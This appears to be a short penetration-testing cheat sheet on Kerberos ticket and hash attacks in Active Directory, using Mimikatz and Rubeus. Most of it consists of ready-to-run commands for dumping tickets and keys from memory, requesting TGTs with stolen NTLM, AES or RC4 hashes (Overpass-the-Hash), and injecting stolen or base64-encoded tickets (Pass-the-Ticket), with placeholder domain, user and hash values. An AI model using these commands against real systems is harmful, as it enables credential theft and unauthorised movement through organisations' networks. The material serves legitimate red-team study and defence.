# Ticket/Hash Attacks

## Exporting Tickets

### **Mimikatz**

```powershell
sekurlsa::tickets /export
or if don't work try
sekurlsa::ekeys
```

The tickets ending with a <mark style="color:green;">**$**</mark> symbol represent the computer account, which requires a ticket to communicate with the **AD**. User tickets, on the other hand, include the user's name, followed by an <mark style="color:green;">**@**</mark> symbol that separates the service name and the domain. For example: <mark style="color:green;">**\[randomvalue]-username@service-domain.local.kirbi**</mark>.

### **Rubeus**

```powershell
Rubeus.exe dump /nowrap
```

## Overpass-The-Hash

When <mark style="color:green;">**Pass-The-Hash**</mark> is mostly used to bypass regular login, then <mark style="color:green;">**Overpass-The-Hash**</mark> is using hash for requesting **TGT** from **KDC**.

### Mimikatz

```powershell
sekurlsa::pth /domain:amogus.kek /user:carni7 /ntlm:1293uo1uwfoi1hw081
```

### Rubeus

Here we use <mark style="color:red;">**asktgt**</mark> module to request a **TGT** using hash and **KDC**.

```powershell
Rubeus.exe asktgt /domain:amogus.kek /user:carni7 /aes256:1293uo1uwfoi1hw081 /nowrap
```

## Pass-The-Ticket

<mark style="color:green;">**Pass-The-Ticket**</mark> in contrast of <mark style="color:green;">**Pass-The-Hash**</mark> and <mark style="color:green;">**Overpass-The-Hash**</mark> use a ticket to gain access to the TGS and then for service.

### Mimikatz

```
kerberos::ptt "C:\Users\carni7\Desktop\Mimikatz\[0;7f830]-5-2-43f10000-carni7@krbtgt-amogus.kek.kirbi"
```

### Rubeus PTT Using Hash

```
Rubeus.exe asktgt /domain:amogus.kek /user:carni7 /rc4:1293uo1uwfoi1hw081 /ptt
```

Unlike command for <mark style="color:green;">**Overpass-The-Hash**</mark>, here we are using <mark style="color:red;">**/ptt**</mark> to do both <mark style="color:green;">**Overpass-The-Hash**</mark> and <mark style="color:green;">**Pass-The-Ticket**</mark> simultaneously. But that only works if we give <mark style="color:red;">**/hash**</mark>: instead of ticket

### Rubeus PTT Using Ticket

```powershell
Rubeus.exe ptt /ticket:[0;7f830]-5-2-43f10000-carni7@krbtgt-amogus.kek.kirbi
```

### Rubeus PTT Using Encoded Ticket

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;7f830]-5-2-43f10000-carni7@krbtgt-amogus.kek.kirbi"))
```

```powershell
Rubeus.exe ptt /ticket:LETSIMAGINETHISISOURBASE64ENCODEDKERBEROSTICKET
```
